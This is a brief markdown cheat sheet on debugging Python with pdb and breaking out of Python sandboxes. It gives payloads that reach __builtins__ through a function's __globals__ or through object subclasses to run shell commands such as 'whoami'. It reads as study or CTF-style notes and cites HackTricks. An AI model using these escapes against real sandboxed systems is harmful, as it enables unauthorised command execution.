## Debug python script and bypass python sandbox

add two line in your python script.

```python
import pdb;
pdb.set_trace()
```


## Example

```
# show attr, like a.X
(Pdb) dir(test)
['__annotations__', '__builtins__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__getstate__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
```


```
# show as key, like a[X]
(Pdb) (test.__globals__).keys()
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__annotations__', '__builtins__', '__file__', '__cached__', 'os', 'test'])
```

if we got `__globals__`, we can got command execution:

```
(Pdb) type(test)
<class 'function'>

# test is function
test.__globals__['__builtins__'].__import__("os").system("whoami")
test.__globals__['__builtins__'].__import__("os").popen("whoami").read()

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```

## Reference

+ https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
+ https://youtu.be/DYp9TFnZH-g?t=1110 